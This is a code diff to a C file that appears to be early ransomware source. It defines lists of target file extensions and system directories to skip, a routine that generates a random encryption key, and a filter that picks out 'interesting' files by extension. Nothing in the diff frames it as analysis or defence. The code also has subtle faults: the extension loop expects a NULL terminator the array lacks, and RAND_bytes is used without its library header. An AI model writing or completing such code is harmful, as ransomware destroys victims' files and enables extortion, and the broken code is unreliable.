@@ -1,8 +1,9 @@
 #include <stdio.h>
-#include <cmath>
+#include <stdlib.h>
+#include <string.h>
 
 
-#define MAX_FILE_SIZE int64_t(20 + 1e+6)
+#define KEY_SIZE 32
 
 const char *extensions[] = {
     // Text Files
@@ -32,7 +33,8 @@ const char *extensions[] = {
     // Config files
     "cfg", "conf", "ini", "prf",
     // Source files
-    "html", "php", "js", "c", "cc", "py", "lua", "go", "java"};
+    "html", "php", "js", "c", "cc", "py", "lua", "go", "java"
+};
 
 const char *skip_dir[] = {
     "ProgramData",
@@ -47,3 +49,27 @@ const char *skip_dir[] = {
     "AppData",
     "$Recycle.Bin",
 };
+
+
+void generate_random_key(char *key) {
+    if (RAND_bytes((unsigned char *)key, KEY_SIZE) != 1) {
+        fprintf(stderr, "Error generating random key\n");
+        exit(EXIT_FAILURE);
+    }
+}
+
+int interessing_extension(const char *filename) {
+    const char *dot = strrchr(filename, '.');
+
+    if (!dot || dot == filename) return 0;
+
+    const char *ext = dot + 1;
+
+    for (int i = 0; extensions[i]; i++) {
+        if (strcmp(ext, extensions[i]) == 0) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
